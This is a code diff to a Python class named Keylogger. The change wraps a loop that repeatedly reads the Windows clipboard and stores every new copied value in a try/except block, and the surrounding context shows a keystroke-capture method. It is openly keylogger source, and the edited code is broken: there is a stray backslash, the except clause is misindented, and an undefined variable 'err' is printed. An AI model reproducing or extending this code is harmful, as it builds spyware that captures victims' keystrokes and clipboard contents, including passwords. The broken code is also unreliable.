@@ -41,18 +41,21 @@ class Keylogger:
         # Initialize the clipboard text
         txt = ""
         while True:
-            # Open the clipboard
-            win32clipboard.OpenClipboard()
-            # Get the copied data from the clipboard
-            copied = win32clipboard.GetClipboardData()
-            # Close the clipboard
-            win32clipboard.CloseClipboard()
-            # If the copied data is different from the previous clipboard text
-            if copied != txt:
-                self.copied_data.append(copied)
-                txt = copied
-            # Wait for 0.5 seconds
-            time.sleep(SLEEP)
+            try:
+                # Open the clipboard
+                win32clipboard.OpenClipboard()
+                # Get the copied data from the clipboard
+                copied = win32clipboard.GetClipboardData()
+                # Close the clipboard
+                win32clipboard.CloseClipboard()
+                # If the copied data is different from the previous clipboard text
+                if copied != txt:
+                    self.copied_data.append(copied)
+                    txt = copied
+                # Wait for 0.5 seconds
+                time.sleep(SLEEP)\
+                except Exception as error:
+                    print("error in extracting clipboard: " + err)
 
     def keyboard_tracker(self, event):
         key = event.name
